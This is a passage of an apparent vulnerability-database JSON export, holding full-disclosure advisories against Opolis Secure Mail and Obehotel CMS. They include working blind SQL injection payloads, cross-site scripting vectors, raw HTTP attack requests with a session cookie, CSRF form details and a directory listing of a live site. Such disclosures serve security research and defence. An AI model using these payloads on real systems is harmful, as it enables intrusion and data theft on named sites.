information.  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n`\n",
            "cvss": {
                "score": 7.8,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:NONE/I:NONE/A:COMPLETE/"
            },
            "vhref": "https://vulners.com/packetstorm/PACKETSTORM:126851"
        },
        {
            "bulletinFamily": "exploit",
            "description": "",
            "modified": "2013-10-07T00:00:00",
            "published": "2013-10-07T00:00:00",
            "href": "https://packetstormsecurity.com/files/123527/Opolis.eu-Secure-Mail-Blind-SQL-Injection-XSS-CSRF-DoS.html",
            "id": "PACKETSTORM:123527",
            "type": "packetstorm",
            "title": "Opolis.eu Secure Mail Blind SQL Injection / XSS / CSRF / DoS",
            "sourceData": "`=========================================================================================================================================================================  \nOPOLIS.EU SECURE MAIL Blind SQLInjection / Cross site scripting / CSRF / Apacche httpd Remote D.O.S /PHP hangs on parsing particular strings as floating point number/User credentials are sent in clear text  \n==========================================================================================================================================================================  \n  \nTIME-LINE VULNERABILITY  \n  \nMultiples Advisories   \n  \nOpolis Secure IT-Services GmbH  \n  \nAddress:Romberggasse 3  \n1230 Vienna  \nAustria  \nE-Mail Contact: helpdesk@opolis.eu<helpdesk@opolis.eu>  \n  \nBUT   \n  \nNot Response  \n  \nTHEN  \n  \nFull Disclosure  \n  \n  \nI. VULNERABILITY  \n-------------------------  \n#Title: OPOLIS.EU SECURE MAIL BLIND SQLInjection / Cross site scripting /Cross Site Request Forgery/ Apache httpd Remote D.O.S /PHP hangs on parsing particular strings as floating point number/ Credentials are sent in clear text  \n  \n#Vendor:http://www.opolis.eu/  \n  \n#Author:Juan Carlos Garc\u00eda (@secnight)  \n  \n#Follow me   \nTwitter:@secnight  \n  \nII. DESCRIPTION  \n-------------------------  \nOpolis Secure Mail is dedicated to provide the most user-friendly high-security E-Mail and document messaging service.  \nOpolis re-defines E-Mail with its \u201cPower to the Sender\u201d philosophy: The sender decides if or how E-Mails may be further   \nprocessed and the sender monitors the processing and forwarding flow of messages. Opolis also offers co-branded solutions  \nfor internet and E-Mail communication as well as document messaging. Opolis Secure Mail is owned by privately-held PI Technology Co WLL.  \n  \nIII. PROOF OF CONCEPT  \n-------------------------  \n  \nBlind SQL Injection  \n********************  \n  \nVulnerability description  \n-------------------------  \n  \nSQL injection is a vulnerability that allows an attacker to alter back-end SQL statements by manipulating the user input. An SQL injection occurs when web applications accept user input that is directly placed into a SQL statement and   \n  \ndoesn't properly filter out dangerous characters.   \n  \nThis is one of the most common application layer attacks currently being used on the Internet. Despite the fact that it is relatively easy to protect against, there is a large number of web applications vulnerable.  \n  \nAffected items  \n----------------  \n  \n/createOpolisWorkGroup/createOpolisWorkGroupStep5.php   \n  \n  \nURL encoded POST input checkedemail was set to 1';select pg_sleep(2); --   \n  \nPOST /createOpolisWorkGroup/createOpolisWorkGroupStep5.php   \n  \naiacademic=1&aiaddressline1=3137%20Laguna%20Street&aiaddressline2=3137%20Laguna%20Street&aicity=San%20Francisco&aicountry=NIL&aifirstname=myufyvmc&ailanguage=English&ailastname=myufyvmc&aititle=Mr.&aizip=94102&checkedemail=1%27%3bselect  \n  \n%20pg_sleep%282%29%3b%20--%20&checkedloginname=&createcodes=&showcheckedemail=sample%40email.tst&showcheckedloginname=myufyvmc  \n  \n  \n  \n/slimstat/stats_js.php   \n  \n\"ttl\"  \n  \nURL encoded GET input \"ttl\" was set to IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDEADBEEF)),SLEEP(3))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDEADBEEF)),SLEEP(3)))OR'|\"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK  \n  \n(2000000,SHA1(0xDEADBEEF)),SLEEP(3)))OR\"*/  \n  \n  \n  \nGET /slimstat/stats_js.php?ref=&res=1920x1080&ts=1381056265&ttl=IF%28SUBSTR%28%40%40version%2c1%2c1%29%3c5%2cBENCHMARK%282000000%2cSHA1%280xDEADBEEF%29%29%2cSLEEP%283%29%29%2f*%27XOR%28IF%28SUBSTR%28%40%40version  \n  \n%2c1%2c1%29%3c5%2cBENCHMARK%282000000%2cSHA1%280xDEADBEEF%29%29%2cSLEEP%283%29%29%29OR%27%7c%22XOR%28IF%28SUBSTR%28%40%40version%2c1%2c1%29%3c5%2cBENCHMARK%282000000%2cSHA1%280xDEADBEEF%29%29%2cSLEEP%283%29%29%29OR%22*%  \n  \nGET /slimstat/stats_js.php?ref=&res=1920x1080&ts=1381056265&ttl=IF%28SUBSTR%28%40%40version%2c1%2c1%29%3c5%2cBENCHMARK%282000000%2cSHA1%280xDEADBEEF%29%29%2cSLEEP%283%29%29%2f*%27XOR%28IF%28SUBSTR%28%40%40version  \n  \n%2c1%2c1%29%3c5%2cBENCHMARK%282000000%2cSHA1%280xDEADBEEF%29%29%2cSLEEP%283%29%29%29OR%27%7c%22XOR%28IF%28SUBSTR%28%40%40version%2c1%2c1%29%3c5%2cBENCHMARK%282000000%2cSHA1%280xDEADBEEF%29%29%2cSLEEP%283%29%29%29OR%22*%  \n  \n  \n\"url\"  \n  \nURL encoded GET input \"url\" was set to IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDEADBEEF)),SLEEP(3))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDEADBEEF)),SLEEP(3)))OR'|\"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK  \n  \n(2000000,SHA1(0xDEADBEEF)),SLEEP(3)))OR\"*/  \n  \n  \n  \nGET /slimstat/stats_js.php?ref=&res=1920x1080&ts=1381056265&ttl=O!polis%20Secure%20Mail%20Service&url=IF%28SUBSTR%28%40%40version%2c1%2c1%29%3c5%2cBENCHMARK%282000000%2cSHA1%280xDEADBEEF%29%29%2cSLEEP%283%29%29%2f*%27XOR%28IF%28SUBSTR  \n  \n%28%40%40version%2c1%2c1%29%3c5%2cBENCHMARK%282000000%2cSHA1%280xDEADBEEF%29%29%2cSLEEP%283%29%29%29OR%27%7c%22XOR%28IF%28SUBSTR%28%40%40version%2c1%2c1%29%3c5%2cBENCHMARK%282000000%2cSHA1%280xDEADBEEF%29%29%2cSLEEP%283%29%29%29OR%22*%2f   \n  \n  \nGET /slimstat/stats_js.php?ref=&res=1920x1080&ts=1381056265&ttl=O!polis%20Secure%20Mail%20Service&url=IF%28SUBSTR%28%40%40version%2c1%2c1%29%3c5%2cBENCHMARK%282000000%2cSHA1%280xDEADBEEF%29%29%2cSLEEP%283%29%29%2f*%27XOR%28IF%28SUBSTR  \n  \n%28%40%40version%2c1%2c1%29%3c5%2cBENCHMARK%282000000%2cSHA1%280xDEADBEEF%29%29%2cSLEEP%283%29%29%29OR%27%7c%22XOR%28IF%28SUBSTR%28%40%40version%2c1%2c1%29%3c5%2cBENCHMARK%282000000%2cSHA1%280xDEADBEEF%29%29%2cSLEEP%283%29%29%29OR%22*%2f  \n  \n  \nCross site scripting ( 67 )  \n*********************  \n  \nCross site scripting (also referred to as XSS) is a vulnerability that allows an attacker to send malicious  \ncode (usually in the form of Javascript) to another user. Because a browser cannot know if the script should be  \ntrusted or not, it will execute the script in the user context allowing the attacker to access any cookies  \nor session tokens retained by the browser.   \n  \nAffected items  \n----------------  \n  \n/createOpolisWorkGroup/createOpolisWorkGroupStep1.php (2)  \n  \nURL encoded POST input OSMLogInNam was set to hkmohkhr_974672\"():;934304  \n  \n  \nPOST /createOpolisWorkGroup/createOpolisWorkGroupStep1.php  \n  \ncheckloginname=&OSMLogInNam=hkmohkhr_974672%22%28%29%3a%3b934304  \n  \n  \n  \n/createOpolisWorkGroup/createOpolisWorkGroupStep2.php (2)  \n  \nURL encoded POST input currentEmail was set to sample%40email.tst_940309\"():;974560  \n  \n  \nPOST /createOpolisWorkGroup/createOpolisWorkGroupStep2.php   \n  \ncurrentEmail=sample%2540email.tst_940309%22%28%29%3a%3b974560&showcheckedloginname=rgrdtkbl  \n  \n  \n  \n/OpolisSignUp/OpolisSignUpStep1a.php (2)  \n  \nURL encoded POST input OSMLogInNam was set to etomstqd_911786\"():;974637  \n  \nPOST /OpolisSignUp/OpolisSignUpStep1a.php   \n  \ncheckloginname=&OSMLogInNam=etomstqd_911786%22%28%29%3a%3b974637  \n  \n  \n  \n  \n/OpolisSignUp/OpolisSignUpStep2a.php   \n  \nURL encoded POST input currentEmail was set to sample%40email.tst_928249\"():;986211  \n  \nThe input is reflected inside <script> tag between double quotes.  \n  \n  \n  \nPOST /OpolisSignUp/OpolisSignUpStep2a.php   \n  \n  \ncurrentEmail=sample%2540email.tst_928249%22%28%29%3a%3b986211&showcheckedloginname=vethpimh  \n  \n  \n/createOpolisWorkGroup/createOpolisWorkGroupStep2.php. (3)  \n  \nURL encoded POST input checkedloginname was set to 1\" onmouseover=prompt(939864) bad=\"  \n  \n  \nPOST /createOpolisWorkGroup/createOpolisWorkGroupStep2.php  \n  \ncheckedloginname=1%22%20onmouseover%3dprompt%28939864%29%20bad%3d%22&showEmailfield=  \n  \n  \n  \n/createOpolisWorkGroup/createOpolisWorkGroupStep3.php. (5)  \n  \n  \nURL encoded POST input checkedemail was set to 1\" onmouseover=prompt(911118) bad=\"  \n  \nPOST /createOpolisWorkGroup/createOpolisWorkGroupStep3.php   \n  \ncheckedemail=1%22%20onmouseover%3dprompt%28911118%29%20bad%3d%22&checkedloginname=&showverifyEmailfield  \n  \n  \n  \nPOST /createOpolisWorkGroup/createOpolisWorkGroupStep4.php. (5)  \n  \nURL encoded POST input checkedemail was set to 1\" onmouseover=prompt(967963) bad=\"  \n  \ncheckedemail=1%22%20onmouseover%3dprompt%28967963%29%20bad%3d%22&checkedloginname=&createcodes=&showcheckedemail=sample%40email.tst&showcheckedloginname=juvgwacr&verifycurrentEmail=sample%40email.tst  \n  \n  \n  \n/createOpolisWorkGroup/createOpolisWorkGroupStep5.php. (52)  \n  \nURL encoded POST input aicountry was set to Antarctica'\"()&%<ScRiPt >prompt(973546)</ScRiPt>  \n  \naiacademic=1&aiaddressline1=3137%20Laguna%20Street&aiaddressline2=3137%20Laguna%20Street&aicity=San%20Francisco&aicountry=Antarctica%27%22%28%29%26%25%3cScRiPt%20%3eprompt%28973546%29%3c%2fScRiPt  \n  \n%3e&aifirstname=kmaqpmwp&ailanguage=English&ailastname=kmaqpmwp&aititle=Mr.&aizip=94102&checkedemail=&checkedloginname=&createcodes=&showcheckedemail=sample%40email.tst&showcheckedloginname=kmaqpmwp  \n  \n  \n  \n  \n/OpolisSignUp/OpolisSignUpStep2a.php. (3)  \n  \nURL encoded POST input checkedloginname was set to 1\" onmouseover=prompt(994853) bad=\"  \n  \ncheckedloginname=1%22%20onmouseover%3dprompt%28994853%29%20bad%3d%22&showEmailfield=  \n  \n  \n/OpolisSignUp/OpolisSignUpStep3a.php. (5)  \n  \nURL encoded POST input checkedemail was set to 1\" onmouseover=prompt(935016) bad=\"  \n  \ncheckedemail=1%22%20onmouseover%3dprompt%28935016%29%20bad%3d%22&checkedloginname=&showverifyEmailfield=  \n  \n  \nCross Site Request Forgery CSRF (12)  \n*******************************  \n  \nCross-site request forgery, also known as a one-click attack or session riding and abbreviated as CSRF or XSRF,  \nis a type of malicious exploit of a website whereby unauthorized commands are transmitted from a user that the website trusts.  \n  \n  \nAffected items  \n---------------  \n/createOpolisWorkGroup/createOpolisWorkGroupStep1.php   \n/createOpolisWorkGroup/createOpolisWorkGroupStep2.php (f3d86faf83a15fd403feae569c201ee0)   \n/createOpolisWorkGroup/createOpolisWorkGroupStep3.php   \n/createOpolisWorkGroup/createOpolisWorkGroupStep4.php (32e4ce87958c47459e9174f94651b76d)   \n/OpolisSignUp/OpolisSignUpStep1a.php   \n/OpolisSignUp/OpolisSignUpStep2a.php (f3d86faf83a15fd403feae569c201ee0)   \n/OpolisSignUp/OpolisSignUpStep3a.php   \n/slimstat (9200b13decfada22b75676834e865e65)   \n  \nThe impact of this vulnerability  \n---------------------------------  \n  \nAn attacker may force the users of a web application to execute actions of the attacker's choosing.   \nA successful CSRF exploit can compromise end user data and operation in case of normal user.   \nIf the targeted end user is the administrator account, this can compromise the entire web application.  \n  \n  \nTwo examples ( too much security flaws .. )  \n  \n/createOpolisWorkGroup/createOpolisWorkGroupStep1.php. (2)  \n  \nAttack details  \n----------------  \nForm name: OSMSignUp  \nForm action: http://www.opolis.eu/createOpolisWorkGroup/createOpolisWorkGroupStep1.php  \nForm method: POST  \n  \nForm inputs:  \n  \ncheckloginname [Hidden]  \nOSMLogInNam [Text]  \n  \n  \n/createOpolisWorkGroup/createOpolisWorkGroupStep2.php (f3d86faf83a15fd403feae569c201ee0).   \n  \nAttack details  \n-----------------  \nForm name: OSMSignUp  \nForm action: http://www.opolis.eu/createOpolisWorkGroup/createOpolisWorkGroupStep2.php  \nForm method: POST  \n  \nForm inputs:  \n  \nshowcheckedloginname [Text]  \ncurrentEmail [Text]  \n  \nPOST /createOpolisWorkGroup/createOpolisWorkGroupStep2.php  \n  \ncheckedloginname=&showEmailfield=  \n  \n  \n  \nApache httpd Remote D.O.S (2)  \n**************************  \n  \nVulnerability description  \n-------------------------------  \nA denial of service vulnerability has been found in the way the multiple overlapping ranges are handled by the Apache HTTPD server:   \n  \nhttp://seclists.org/fulldisclosure/2011/Aug/175   \n  \nAn attack tool is circulating in the wild. Active use of this tools has been observed.   \n  \nThe attack can be done remotely and with a modest number of requests can cause very significant memory and CPU usage on the server.   \n  \n  \nAffected Apache versions (1.3.x, 2.0.x through 2.0.64, and 2.2.x through 2.2.19).  \n  \n  \nHow to fix this vulnerability  \n----------------------------  \nUpgrade to the latest version of Apache HTTP Server (2.2.20 or later), available from the Apache HTTP Server Project Web site.   \n  \nWeb references  \n--------------  \nCVE-2011-3192   \nApache HTTPD Security ADVISORY   \nApache HTTP Server 2.2.20 Released   \nApache httpd Remote Denial of Service (memory exhaustion)   \n  \n  \nApache httpOnly cookie disclosure  \n**********************************  \n  \nVulnerability description  \n----------------------------  \nApache HTTP Server 2.2.x through 2.2.21 does not properly restrict header information during construction of Bad Request (aka 400) error documents, which allows remote attackers to obtain the values of HTTPOnly cookies via vectors   \n  \ninvolving a (1) long or (2) malformed header in conjunction with crafted web script.  \n  \nAffected Apache versions (up to 2.0.21).  \n  \nThe impact of this vulnerability  \n-------------------------------  \nInformation disclosure.  \n  \nHow to fix this vulnerability  \n------------------------------  \nUpgrade Apache 2.x to the latest version. Apache 2.2.22 is the first version that fixed this issue.  \n  \nWeb references  \n---------------  \nFixed in Apache httpd 2.2.22   \nApache HTTP Server 'httpOnly' Cookie Information Disclosure Vulnerability   \n  \n  \n  \nPHP hangs on parsing particular strings as floating point number (2)  \n*****************************************************************  \n  \nPHP hangs when parsing '2.2250738585072011e-308' string as a floating point number.  \n  \nCurrent version is : PHP/5.3.1  \n  \nAffected PHP versions: 5.3 up to version 5.3.5 and 5.2 up to version 5.2.17  \n  \nAffected items  \n---------------  \nWeb Server   \n  \nThe impact of this vulnerability  \n----------------------------------  \nDenial of service attack  \n  \nHow to fix this vulnerability  \n-------------------------------  \nUpgrade PHP to the latest version.  \n  \nWeb references  \n-----------------  \nPHP Hangs On Numeric Value 2.2250738585072011e-308   \nPHP Homepage   \n  \n  \nUser credentials are sent in clear text  \n*****************************************  \n  \nVulnerability description  \n---------------------------  \nUser credentials are transmitted over an unencrypted channel.   \nThis information should always be transferred via an encrypted channel (HTTPS) to avoid being intercepted by malicious users.  \n  \nAffected items  \n--------------  \n/slimstat (9200b13decfada22b75676834e865e65)   \n  \nThe impact of this vulnerability  \n----------------------------------  \nA third party may be able to read the user credentials by intercepting an unencrypted HTTP connection.  \n  \nHow to fix this vulnerability  \n-------------------------------  \nBecause user credentials are considered sensitive information, should always be transferred to the server over an encrypted connection (HTTPS).  \n  \n  \nIV. BUSINESS IMPACT  \n-------------------------  \n  \n( No Comments... )  \n  \nV SOLUTION  \n------------------------  \n  \nVery easy and I don\u00b4t understand... WRITE SECURE CODE P L E A S E !!  \n  \n  \nVI. CREDITS  \n-------------------------  \n  \nThis vulnerability has been discovered  \nby Juan Carlos Garc\u00eda(@secnight)  \n  \n  \nVII. LEGAL NOTICES  \n-------------------------  \n  \nThe Author accepts no responsibility for any damage  \ncaused by the use or misuse of this information.  \n  \n  \n`\n",
            "cvss": {
                "score": 7.8,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:NONE/I:NONE/A:COMPLETE/"
            },
            "vhref": "https://vulners.com/packetstorm/PACKETSTORM:123527"
        },
        {
            "bulletinFamily": "exploit",
            "description": "Obehotel CMS suffers from denial of service, insecure transit, directory listing, and remote SQL injection vulnerabilities.",
            "modified": "2013-08-27T00:00:00",
            "published": "2013-08-27T00:00:00",
            "id": "1337DAY-ID-21170",
            "href": "https://0day.today/exploit/description/21170",
            "type": "zdt",
            "title": "Obehotel CMS SQL Injection Vulnerability",
            "sourceData": "OBEHOTEL (Spanish) CMS Blind SQLinjection /  Apache httpd Remote Denial of Service / Directory Listing / Insecure transition from HTTPS to HTTP in form post\r\n\r\nI-VULNERABILITY\r\n-------------------------\r\n\r\n#Title: OBEHOTEL CMS Blind SQLinjection /  Apache httpd Remote Denial of Service /  Directory Listing  / Insecure transition from HTTPS to HTTP in form post\r\n\r\n#Vendor:https://secureadv.obehotel.com/mpa/\r\n\r\n#Author:Juan Carlos Garc\u00eda (@secnight)\r\n\r\n#Follow me \r\n\r\n http://www.highsec.es\r\n http://hackingmadrid.blogspot.com\r\nTwitter:@secnight\r\n\r\n\r\n\r\nII-Introduction:\r\n================\r\n\r\nObehotel is the set of different solutions, technological developments and applications directed\r\nto hotels for online marketing and distribution aimed at improving both hoteliers processes such as customer experience.\r\n\r\nObehotel is the result of joint effort conducted by professionals with extensive experience in the ICT-Sector\r\nEfimatica-and marketing professionals-Travel Tourism Sector Holidaysinspain.com-like main online distribution partner.\r\n\r\nThis union puts them as one of the major Spanish companies specializing in online distribution technology applied to the Hospitality Industry.\r\n\r\n-------------------------\r\n\r\nIII-PROOF OF CONCEPT\r\n====================\r\n\r\n\r\nAttack details\r\n--------------\r\n\r\nBlind SqlInjection\r\n******************\r\n\r\nSQL injection is a vulnerability that allows an attacker to alter backend SQL statements by manipulating the user input.\r\n\r\nAn SQL injection occurs when web applications accept user input that is directly placed into a SQL statement and doesn't\r\nproperly filter out dangerous characters. \r\n\r\nAn attacker may execute arbitrary SQL statements on the vulnerable system. This may compromise the integrity of your database and/or expose sensitive information. \r\n\r\nDepending on the back-end database in use, SQL injection vulnerabilities lead to varying levels of data/system access for the attacker.\r\n\r\nIt may be possible to not only manipulate existing queries, but to UNION in arbitrary data, use subselects, or append additional queries. In some cases,\r\nit may be possible to read in or write out to files, or to execute shell commands on the underlying operating system.\r\n\r\nCertain SQL Servers such as Microsoft SQL Server contain stored and extended procedures (database server functions). \r\n\r\nIf an attacker can obtain access to these procedures it may be possible to compromise the entire machine.\r\n\r\n\r\n\r\nAttack details\r\n--------------\r\n\r\nURL encoded POST input username was set to\r\n\r\nxlgskuot' or (sleep(2)+1) limit 1 -- \r\n\r\nPOST /mpa/index.php \r\n\r\n\r\nServer: Apache/2.2.16 (Debian)\r\nX-Powered-By: PHP/5.3.3-7+squeeze14\r\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\r\nCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0\r\nPragma: no-cache\r\nLocation: ./hotel_inicio/index.php\r\nVary: Accept-Encoding\r\nContent-Length: 3402\r\nKeep-Alive: timeout=15, max=92\r\nConnection: Keep-Alive\r\nContent-Type: text/html; charset=utf-8\r\n\r\n\r\npassword=g00dPa$$w0rD&username=xlgskuot%27%20or%20%28sleep%282%29%2b1%29%20limit%201%20--%20\r\n\r\nvariant (1)\r\n\r\nname\r\n\r\nPOST /mpa/index.php HTTP/1.1\r\nContent-Length: 92\r\nContent-Type: application/x-www-form-urlencoded\r\nCookie: PHPSESSID=sto2bv4krb2h4f0n45tm6o4hn3\r\nHost: secureadv.obehotel.com\r\nConnection: Keep-alive\r\nAccept-Encoding: gzip,deflate\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0)\r\nAccept: */*\r\n\r\npassword=g00dPa$$w0rD&username=xlgskuot%27%20or%20%28sleep%282%29%2b1%29%20limit%201%20--%20\n\n#  0day.today [2018-02-06]  #",
            "cvss": {
                "score": 7.8,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:NONE/I:NONE/A:COMPLETE/"
            },
            "vhref": "https://vulners.com/zdt/1337DAY-ID-21170"
        },
        {
            "bulletinFamily": "exploit",
            "description": "",
            "modified": "2013-08-26T00:00:00",
            "published": "2013-08-26T00:00:00",
            "href": "https://packetstormsecurity.com/files/122962/Obehotel-CMS-Denial-Of-Service-SQL-Injection.html",
            "id": "PACKETSTORM:122962",
            "type": "packetstorm",
            "title": "Obehotel CMS Denial Of Service / SQL Injection",
            "sourceData": "`  \nOBEHOTEL (Spanish) CMS Blind SQLinjection / Apache httpd Remote Denial of Service / Directory Listing / Insecure transition from HTTPS to HTTP in form post  \n  \nI-VULNERABILITY  \n-------------------------  \n  \n#Title: OBEHOTEL CMS Blind SQLinjection / Apache httpd Remote Denial of Service / Directory Listing / Insecure transition from HTTPS to HTTP in form post  \n  \n#Vendor:https://secureadv.obehotel.com/mpa/  \n  \n#Author:Juan Carlos Garc\u00eda (@secnight)  \n  \n#Follow me   \n  \nhttp://www.highsec.es  \nhttp://hackingmadrid.blogspot.com  \nTwitter:@secnight  \n  \n  \n  \nII-Introduction:  \n================  \n  \nObehotel is the set of different solutions, technological developments and applications directed  \nto hotels for online marketing and distribution aimed at improving both hoteliers processes such as customer experience.  \n  \nObehotel is the result of joint effort conducted by professionals with extensive experience in the ICT-Sector  \nEfimatica-and marketing professionals-Travel Tourism Sector Holidaysinspain.com-like main online distribution partner.  \n  \nThis union puts them as one of the major Spanish companies specializing in online distribution technology applied to the Hospitality Industry.  \n  \n-------------------------  \n  \nIII-PROOF OF CONCEPT  \n====================  \n  \n  \nAttack details  \n--------------  \n  \nBlind SqlInjection  \n******************  \n  \nSQL injection is a vulnerability that allows an attacker to alter backend SQL statements by manipulating the user input.  \n  \nAn SQL injection occurs when web applications accept user input that is directly placed into a SQL statement and doesn't  \nproperly filter out dangerous characters.   \n  \nAn attacker may execute arbitrary SQL statements on the vulnerable system. This may compromise the integrity of your database and/or expose sensitive information.   \n  \nDepending on the back-end database in use, SQL injection vulnerabilities lead to varying levels of data/system access for the attacker.  \n  \nIt may be possible to not only manipulate existing queries, but to UNION in arbitrary data, use subselects, or append additional queries. In some cases,  \nit may be possible to read in or write out to files, or to execute shell commands on the underlying operating system.  \n  \nCertain SQL Servers such as Microsoft SQL Server contain stored and extended procedures (database server functions).   \n  \nIf an attacker can obtain access to these procedures it may be possible to compromise the entire machine.  \n  \n  \n  \nAttack details  \n--------------  \n  \nURL encoded POST input username was set to  \n  \nxlgskuot' or (sleep(2)+1) limit 1 --   \n  \nPOST /mpa/index.php   \n  \n  \nServer: Apache/2.2.16 (Debian)  \nX-Powered-By: PHP/5.3.3-7+squeeze14  \nExpires: Thu, 19 Nov 1981 08:52:00 GMT  \nCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0  \nPragma: no-cache  \nLocation: ./hotel_inicio/index.php  \nVary: Accept-Encoding  \nContent-Length: 3402  \nKeep-Alive: timeout=15, max=92  \nConnection: Keep-Alive  \nContent-Type: text/html; charset=utf-8  \n  \n  \npassword=g00dPa$$w0rD&username=xlgskuot%27%20or%20%28sleep%282%29%2b1%29%20limit%201%20--%20  \n  \nvariant (1)  \n  \nname  \n  \nPOST /mpa/index.php HTTP/1.1  \nContent-Length: 92  \nContent-Type: application/x-www-form-urlencoded  \nCookie: PHPSESSID=sto2bv4krb2h4f0n45tm6o4hn3  \nHost: secureadv.obehotel.com  \nConnection: Keep-alive  \nAccept-Encoding: gzip,deflate  \nUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0)  \nAccept: */*  \n  \npassword=g00dPa$$w0rD&username=xlgskuot%27%20or%20%28sleep%282%29%2b1%29%20limit%201%20--%20  \n  \n  \n  \nApache httpd Remote Denial of Service  \n*************************************  \n  \n  \nA denial of service vulnerability has been found in the way the multiple overlapping ranges   \nare handled by the Apache HTTPD server:   \n  \nhttp://seclists.org/fulldisclosure/2011/Aug/175   \n  \nCVE-2011-3192   \n  \nAn attack tool is circulating in the wild. Active use of this tools has been observed.   \n  \nThe attack can be done remotely and with a modest number of requests can cause very significant memory and CPU usage on the server.  \n  \n  \nAffected Apache versions (1.3.x, 2.0.x through 2.0.64, and 2.2.x through 2.2.19).  \n  \nCurrent version is : 2.2.16   \n  \n  \nDirectory Listing  \n*****************  \n  \nThe web server is configured to display the list of files contained in this directory.  \nThis is not recommended because the directory may contain files that are not normally   \nexposed through links on the web site.A user can view a list of all files from this   \ndirectory possibly exposing sensitive information.  \n  \nAffected items 226  \n  \nAffected items  \n/mpa/core   \n/mpa/core/ajax   \n/mpa/core/ajax/blog   \n/mpa/core/ajax/newsfeed   \n/mpa/core/class   \n/mpa/core/css   \n/mpa/core/css/plugins   \n/mpa/core/fonts   \n/mpa/core/images   \n/mpa/core/images/assets   \n/mpa/core/images/assets/thumb   \n/mpa/core/images/assets/thumb/large   \n/mpa/core/images/assets/thumb/medium   \n/mpa/core/images/assets/thumb/small   \n/mpa/core/images/blueline   \n/mpa/core/images/colorbox   \n/mpa/core/images/colorpicker   \n/mpa/core/images/contrast   \n/mpa/core/images/default   \n/mpa/core/images/greenline   \n/mpa/core/images/headerbg   \n/mpa/core/images/icons   \n/mpa/core/images/icons/64   \n/mpa/core/images/icons/blogperfume   \n/mpa/core/images/icons/blogperfume/Advertisment   \n/mpa/core/images/icons/blogperfume/Archive   \n/mpa/core/images/icons/blogperfume/Article   \n/mpa/core/images/icons/blogperfume/Author   \n/mpa/core/images/icons/blogperfume/Blog%20Roll   \n/mpa/core/images/icons/blogperfume/Comments   \n/mpa/core/images/icons/blogperfume/Date   \n/mpa/core/images/icons/blogperfume/Email   \n/mpa/core/images/icons/blogperfume/Plugins   \n/mpa/core/images/icons/blogperfume/RSS   \n/mpa/core/images/icons/blogperfume/Themes   \n/mpa/core/images/icons/blogperfume/Views   \n/mpa/core/images/icons_actions   \n/mpa/core/images/kozers   \n/mpa/core/images/kozers/original   \n/mpa/core/images/kozers/thumb   \n/mpa/core/images/loaders   \n/mpa/core/images/markers   \n/mpa/core/images/preview   \n/mpa/core/images/thumbs   \n/mpa/core/images/uniform   \n/mpa/core/js   \n/mpa/core/js/custom   \n/mpa/core/js/lang   \n/mpa/core/js/plugins   \n/mpa/core/js/plugins/ckfinder   \n/mpa/core/js/plugins/ckfinder/_samples/php   \n/mpa/core/js/plugins/ckfinder/core   \n/mpa/core/js/plugins/ckfinder/core/connector   \n/mpa/core/js/plugins/ckfinder/core/connector/php   \n/mpa/core/js/plugins/ckfinder/core/connector/php/lang   \n/mpa/core/js/plugins/ckfinder/core/connector/php/php5   \n/mpa/core/js/plugins/ckfinder/core/connector/php/php5/CommandHandler   \n/mpa/core/js/plugins/ckfinder/core/connector/php/php5/Core   \n/mpa/core/js/plugins/ckfinder/core/connector/php/php5/ErrorHandler   \n/mpa/core/js/plugins/ckfinder/core/connector/php/php5/Utils   \n/mpa/core/js/plugins/ckfinder/help   \n/mpa/core/js/plugins/ckfinder/help/cs/files   \n/mpa/core/js/plugins/ckfinder/help/en/files   \n/mpa/core/js/plugins/ckfinder/help/es/files   \n/mpa/core/js/plugins/ckfinder/help/es/files/images   \n/mpa/core/js/plugins/ckfinder/help/es-mx/files   \n/mpa/core/js/plugins/ckfinder/help/es-mx/files/images   \n/mpa/core/js/plugins/ckfinder/help/fi/files   \n/mpa/core/js/plugins/ckfinder/help/fi/files/images   \n/mpa/core/js/plugins/ckfinder/help/files   \n/mpa/core/js/plugins/ckfinder/help/files/images   \n/mpa/core/js/plugins/ckfinder/help/files/other   \n/mpa/core/js/plugins/ckfinder/help/lt/files   \n/mpa/core/js/plugins/ckfinder/help/lt/files/images   \n/mpa/core/js/plugins/ckfinder/help/pl/files   \n/mpa/core/js/plugins/ckfinder/lang   \n/mpa/core/js/plugins/ckfinder/plugins   \n/mpa/core/js/plugins/ckfinder/plugins/dummy   \n/mpa/core/js/plugins/ckfinder/plugins/dummy/lang   \n/mpa/core/js/plugins/ckfinder/plugins/fileeditor   \n/mpa/core/js/plugins/ckfinder/plugins/fileeditor/codemirror   \n/mpa/core/js/plugins/ckfinder/plugins/fileeditor/codemirror/lib   \n/mpa/core/js/plugins/ckfinder/plugins/fileeditor/codemirror/mode   \n/mpa/core/js/plugins/ckfinder/plugins/fileeditor/codemirror/mode/clike   \n/mpa/core/js/plugins/ckfinder/plugins/fileeditor/codemirror/mode/css   \n/mpa/core/js/plugins/ckfinder/plugins/fileeditor/codemirror/mode/htmlmixed   \n/mpa/core/js/plugins/ckfinder/plugins/fileeditor/codemirror/mode/javascript   \n/mpa/core/js/plugins/ckfinder/plugins/fileeditor/codemirror/mode/php   \n/mpa/core/js/plugins/ckfinder/plugins/fileeditor/codemirror/mode/xml   \n/mpa/core/js/plugins/ckfinder/plugins/flashupload   \n/mpa/core/js/plugins/ckfinder/plugins/flashupload/flash   